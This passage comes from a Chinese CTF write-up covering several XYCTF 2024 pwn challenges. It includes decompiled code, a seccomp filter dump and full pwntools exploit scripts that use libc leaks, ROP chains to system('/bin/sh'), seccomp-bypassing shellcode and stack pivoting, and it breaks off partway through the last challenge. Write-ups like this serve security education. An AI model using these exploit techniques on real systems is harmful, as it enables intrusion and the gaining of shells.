alt="hello_world泄露libc调试"></p><p>可以看到printf的ret地址就是一个libc地址。顺带一提，这里显示的__libc_start_call_main+128在2.35的libc下其实是__libc_start_main_ret，这个在libc-database可以直接查到偏移（就是0x29d90），但是通过pwntools是查不到的。</p><p>那么理论上我只要填充0x28+2个字节的padding就能将这个libc地址带出。注意如果用sendline函数的话，payload后会多一个回车，所以payload长度应该是0x28+1就好了。得到libc基址之后，第二个溢出就直接system(&#x2F;bin&#x2F;sh)就好了，需要注意的是这里会出现栈平衡对齐失败打不通的情况，在前面加个ret就好了，不再赘述。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(&#x27;xyctf.top&#x27;, 35594)</span></span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x2a3e5</span></span><br><span class="line">ret_addr = <span class="number">0x29139</span></span><br><span class="line">str_bin_sh_addr = <span class="number">0x1d8678</span></span><br><span class="line">one = [<span class="number">0xebc88</span>, <span class="number">0xebc81</span>, <span class="number">0xebd43</span>, <span class="number">0xebc85</span>, <span class="number">0xebce2</span>, <span class="number">0xebd38</span>, <span class="number">0xebd3f</span>]</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *printf&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">6</span>)+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;b\n&#x27;</span>)</span><br><span class="line">leak_addr = u64(r.recvuntil(<span class="string">b&#x27;\nplea&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr-<span class="number">0x29d90</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>+p64(<span class="number">1</span>)+p64(libc_base+ret_addr)+p64(libc_base+rdi_addr) +p64(libc_base+str_bin_sh_addr)+p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x02-invisible-flag"><a href="#0x02-invisible-flag" class="headerlink" title="0x02 invisible_flag"></a>0x02 invisible_flag</h3><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *addr; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  addr = mmap((<span class="type">void</span> *)<span class="number">0x114514000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;show your magic again&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, addr, <span class="number">0x200</span>uLL);</span><br><span class="line">    sandbox();</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))addr)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的shellcode题，但是有沙箱，扔到seccomp-tools看看情况。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000013  if (A == readv) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000014  if (A == writev) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>好好，execve禁了就算了，把orw也都禁了，快乐的新生赛（滑稽）。无所谓，刚好最近细学了沙箱绕过。这里我们先用openat打开文件，然后用sendfile就可以输出flag了。知道绕过方法和函数参数表后就可以开始手搓汇编了。也可以用pwntools自带的shellcraft来生成shellcode。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;xyctf.top&#x27;</span>, <span class="number">35854</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./vuln&#x27;)</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;    </span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, 3</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x100</span></span><br><span class="line"><span class="string">    push SYS_sendfile</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = asm(sc)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x03-static-link"><a href="#0x03-static-link" class="headerlink" title="0x03 static_link"></a>0x03 static_link</h3><h5 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h5><p>题目是静态编译的，题目除了一个栈溢出什么都没有。system不存在于符号表中，也没有execve，结合符号表中有的函数，有三种思路：</p><ol><li>调用mprotect开辟一块有可执行的内存，然后调用read向这块内存写入shellcode。</li><li>orw。</li><li>ret2syscall</li></ol><p>这里采用了第一种思路，在bss段开辟了rwx权限的内存。静态编译题有个好处就是不怕找不到gadget。</p><h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;xyctf.top&#x27;</span>, <span class="number">59270</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./vuln&#x27;)</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = <span class="number">0x4482C0</span></span><br><span class="line">read_addr = <span class="number">0x447580</span></span><br><span class="line">bss_addr = <span class="number">0x4C7000</span></span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x401f1f</span></span><br><span class="line">rsi_addr = <span class="number">0x409f8e</span></span><br><span class="line">rdx_addr = <span class="number">0x451322</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr) + \</span><br><span class="line">    p64(<span class="number">0x1000</span>)+p64(rdx_addr)+p64(<span class="number">7</span>)+p64(mprotect_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">0</span>)+p64(rsi_addr)+p64(bss_addr +</span><br><span class="line">                                                  <span class="number">0x300</span>)+p64(rdx_addr)+p64(<span class="number">0x100</span>)+p64(read_addr)</span><br><span class="line">payload += p64(bss_addr+<span class="number">0x300</span>)</span><br><span class="line"><span class="comment"># print((len(payload)))</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x04-Guestbook1"><a href="#0x04-Guestbook1" class="headerlink" title="0x04 Guestbook1"></a>0x04 Guestbook1</h3><h5 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">GuestBook</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-224h] BYREF</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">32</span>][<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 id[<span class="number">32</span>]; <span class="comment">// [rsp+210h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to starRail.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please enter your name and id&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;index&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">      <span class="keyword">if</span> ( index &lt;= <span class="number">32</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;out of range&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( index &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, name[index], <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;id:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%hhu&quot;</span>, &amp;id[index]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have a good time!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的函数如上，不能整数溢出，但是有一个很明显的数组越界漏洞，在index&lt;&#x3D;32的地方。那么我们就可以通过id[32]劫持到rbp。那么思路就是栈迁移。rbp记录了调用者的栈帧指针，所以只要把我们要返回的地址写到栈上，然后劫持rbp为该地址-8的位置即可。但是程序没有办法泄露栈地址，所以要爆破1&#x2F;16的几率。</p><h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;xyctf.top&quot;, 33063)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x401252&quot;)</span></span><br><span class="line">backdoor = <span class="number">0x40133A</span></span><br><span class="line">pay = p64(backdoor)*<span class="number">2</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;index&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">32</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;name:&quot;</span>)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;id:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x60</span>).encode())</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>).encode())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x05-babyGift"><a href="#0x05-babyGift" class="headerlink" title="0x05 babyGift"></a>0x05 babyGift</h3><h5 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">GetInfo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name:&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your passwd:&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  fgets(v2, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> Gift(v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后程序还给了一个gift函数，但是实际上是一些gadget,而且在getinfo结束之后一定会运行这些gadget，所以栈布局要考虑上这个函数。这个gift实际上实现了把rdi中的内容放进rbp里这个功能。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401219</span> ; void <span class="type">Gift</span>()</span><br><span class="line">.text:<span class="number">0000000000401219</span>                 public <span class="type">Gift</span></span><br><span class="line">.text:<span class="number">0000000000401219</span> <span class="type">Gift</span>            <span class="keyword">proc</span> near               ; <span class="type">CODE</span> <span class="type">XREF</span>: <span class="type">GetInfo</span>+7F↓p</span><br><span class="line">.text:<span class="number">0000000000401219</span></span><br><span class="line">.text:<span class="number">0000000000401219</span> var_8           = qword ptr -<span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000000401219</span></span><br><span class="line">.text:<span class="number">0000000000401219</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401219</span>                 endbr64</span><br><span class="line">.text:000000000040121D                 push    rbp</span><br><span class="line">.text:000000000040121E                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401221</span>                 mov     [rbp+var_8], rdi</span><br><span class="line">.text:<span class="number">0000000000401225</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000401226</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000401227</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000401227</span> ; &#125; // starts at <span class="number">401219</span></span><br><span class="line">.text:<span class="number">0000000000401227</span> <span class="type">Gift</span>            endp</span><br></pre></td></tr></table></figure><p>有一个很明显的栈溢出，应该就是突破口了。</p><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>题目给了libc附件，首先要考虑的是如何泄露libc。程序里没有puts函数，所以考虑用printf函数，利用fmt来泄露栈上残留的libc地址。printf函数会判断eax是否为0，若不为0则要求栈平衡对齐，为了绕开这个问题，我们利用0x401202处<code>mov eax，0；call _printf</code>的gadget，而不用printf@plt。然后要回到main函数重新执行栈溢出。这里的payload应该是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%27$p&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(call_printf)+p64(<span class="number">1</span>)+p64(start_addr)</span><br></pre></td></tr></table></figure><p>call_printf完了之后会进入到gift函数，p64(1)是为了绕过pop rbp那个gadget，不然会把start_addr吞掉。好家伙，这个gadget反而是害人的东西。</p><p>经过调试，发现27偏移处可以泄露__libc_start_main_ret的地址，然后就可以获得system和binsh的地址。那接下来就栈溢出劫持ret地址getshell就好了。但是有一个问题需要注意，system会卡在movaps上，也就是又遇到了栈平衡的问题。这里不能通过加ret来解决因为溢出的字节不够，所以只好去翻一翻libc文件，找到system函数里跳过push或者pop语句后的地址。因为调试的时候我们发现通常system会卡在do_system这个函数里，所以通过gdb看到偏移，我们在IDA中找到这个函数，并且跳过他的push语句。</p><p><img src="https://c-lby.top/images/2024xyctf_pwn_wp/babygift_do_system.png" alt="babygift_do_system"></p><p>我们跳过<code>push r15</code>，也就是直接从0x50902开始就能绕过栈平衡问题。</p><h5 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;xyctf.top&#x27;, 34099)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">printf_plt = <span class="number">0x401084</span></span><br><span class="line">printf_got = <span class="number">0x403FD8</span></span><br><span class="line">main_addr = <span class="number">0x4012AF</span></span><br><span class="line">gift = <span class="number">0x401219</span></span><br><span class="line">call_printf = <span class="number">0x401202</span></span><br><span class="line">start_addr = <span class="number">0x4010B0</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *printf&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;%27$p&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(call_printf)+p64(<span class="number">1</span>)+p64(start_addr)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;passwd&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak_add = <span class="built_in">int</span>(r.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libcbase = leak_add-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">128</span></span><br><span class="line">system = libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">str_bin_sh = libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">rdi_ret = libcbase+<span class="number">0x2a3e5</span></span><br><span class="line">do_system_addr = libcbase+<span class="number">0x50902</span></span><br><span class="line">log.info(<span class="string">&#x27;libcbase &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *system&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># name直接跳了，应该是缓冲区里还有回车</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p64(rdi_ret)+p64(str_bin_sh)+p64(do_system_addr)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;passwd&#x27;</span>, payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x06-intermittent"><a href="#0x06-intermittent" class="headerlink" title="0x06 intermittent"></a>0x06 intermittent</h3><h5 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  _DWORD buf[<span class="number">66</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v5 = (<span class="type">void</span> (*)(<span class="type">void</span>))mmap((<span class="type">void</span> *)<span class="number">0x114514000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == (<span class="type">void</span> (*)(<span class="type">void</span>))<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span 